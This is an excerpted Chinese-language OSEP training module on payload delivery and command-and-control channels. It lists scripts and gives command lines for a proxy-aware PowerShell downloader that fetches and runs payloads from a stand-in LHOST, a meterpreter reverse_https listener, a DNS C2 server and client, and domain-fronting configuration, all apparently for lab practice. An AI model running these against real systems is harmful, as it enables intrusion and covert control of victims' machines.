...
> cheat sheet 依据：PowerShell Stager（Encrypted & Obfuscated / Unencrypted）、Encode PowerShell Payloads ｜ 教材依据：第 4、7、9、14 章（§14.2–14.7）
> 前置依赖：攻击机（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [`docs/00-environment-and-infra.md`](/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。
...
python3 scripts/python/m00-delivery-server.py --port 80 --dir ~/osep/payloads   # 请求日志确认"是否真的下载"
```
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/python/m00-delivery-server.py` | 下载版的投递 + 请求日志 | `--port 80 --dir ~/osep/payloads` |
| `scripts/vba/m01-shellcode-runner-vba-archbranch.vba` | 内嵌版参考（先判位数再选 shellcode） | 粘 shellcode 段 |
| `scripts/jscript/m03-dotnettojscript-loader.js` | 内嵌第二阶段的桥接参考 | 粘 C# payload |
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | 下载走系统代理时的下载器 | 见场景 28 |
...
#### 源码 `scripts/jscript/m03-dotnettojscript-loader.js` {#scripts-jscript-m03-dotnettojscript-loader-js}
...
#### 源码 `scripts/powershell/m09-proxy-aware-downloader.ps1` {#scripts-powershell-m09-proxy-aware-downloader-ps1}
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | 系统代理/显式代理下载，支持认证 | `-Url http://LHOST/PAYLOAD -OutFile` 或 `-Command` |
| `scripts/python/m00-delivery-server.py` | 投递 + 确认目标请求 | `--port 80 --dir ~/osep/payloads` |
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | 双上下文下载器；SYSTEM 下用显式代理 | `-ProxyUrl http://proxy:8080 -DefaultCreds` |
| `scripts/python/m00-delivery-server.py` | 验证 SYSTEM 是否真的请求到投递地址 | `--port 80` |
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/infra/m09-https-listener.sh` | 统一 HTTPS/HTTP handler 入口 | `--mode msf --payload windows/x64/meterpreter/reverse_https` |
| `scripts/python/m00-delivery-server.py` | 第二阶段投递 + 请求日志 | `--port 80 --dir ~/osep/payloads` |
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | 第二阶段下载若需走代理 | `-Url http://LHOST/PAYLOAD -Command` |


#### 源码 `scripts/infra/m09-https-listener.sh` {#scripts-infra-m09-https-listener-sh}
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/infra/m09-https-listener.sh` | HTTPS 监听：msf reverse_https handler 或 TLS 测试模式，记录 UA/握手 | `--mode msf\|ssl-test --cert cert.pem --key key.pem` |
| `scripts/infra/m09-domain-fronting-nginx.conf` | 需要按域名转发/SNI 处理时的前端模板 | 见场景 33 |
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | HTTPS 下载 + 证书校验开关 | `-Url https://LHOST/PAYLOAD -SkipCertCheck` |


#### 源码 `scripts/infra/m09-domain-fronting-nginx.conf` {#scripts-infra-m09-domain-fronting-nginx-conf}
...
sudo python3 scripts/python/m09-dns-c2-server.py --listen 0.0.0.0 --port 53 \
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/python/m09-dns-c2-server.py` | DNS C2 服务端（UDP 53，A 记录应答） | `--listen 0.0.0.0 --port 53 --domain c2.example` |
| `scripts/python/m09-dns-c2-client.py` | DNS C2 客户端（心跳/收命令/回传输出） | `--server LHOST --session a1b2c3d4 --interval 2` |


#### 源码 `scripts/python/m09-dns-c2-server.py` {#scripts-python-m09-dns-c2-server-py}
...
#### 源码 `scripts/python/m09-dns-c2-client.py` {#scripts-python-m09-dns-c2-client-py}
...
```bash
# nginx 前端配置见 scripts/infra/m09-domain-fronting-nginx.conf
# 后端 C2/投递监听
bash scripts/infra/m09-https-listener.sh --mode ssl-test --cert cert.pem --key key.pem --port 8443
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/infra/m09-domain-fronting-nginx.conf` | 自建域前置前端（按 Host 路由到后端） | 替换 FRONT / BACKEND / 证书路径 |
| `scripts/infra/m09-https-listener.sh` | 后端 HTTPS 监听/投递 | `--port 8443` |
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | 目标侧下载（可设 Host 头） | `-Url https://FRONT/PAYLOAD -HostHeader BACKEND` |
...
# 代理感知下载（场景 28/29/31）
powershell -ep bypass -f scripts/powershell/m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -Command -DefaultCreds

# DNS 通道（场景 32，root 起 53）
sudo python3 scripts/python/m09-dns-c2-server.py --domain c2.example
...
bash scripts/infra/m09-https-listener.sh --mode msf --cert cert.pem --key key.pem
```
...
| 脚本 | 对应场景 |
|---|---|
| `scripts/powershell/m09-proxy-aware-downloader.ps1` | 28、29、30、31 |
| `scripts/python/m09-dns-c2-server.py` | 32 |
| `scripts/python/m09-dns-c2-client.py` | 32 |
| `scripts/infra/m09-domain-fronting-nginx.conf` | 33、31 |
| `scripts/infra/m09-https-listener.sh` | 30、31、33 |

跨模块引用：`scripts/python/m00-delivery-server.py`（17/28/30 投递与日志）、`scripts/vba/m01-shellcode-runner-vba-archbranch.vba`（17 内嵌）、`scripts/jscript/m03-dotnettojscript-loader.js`（17 桥接）、[`docs/08-pivoting-tunneling.md`](/modules/08-pivoting-tunneling)（29/30 隧道备选）。
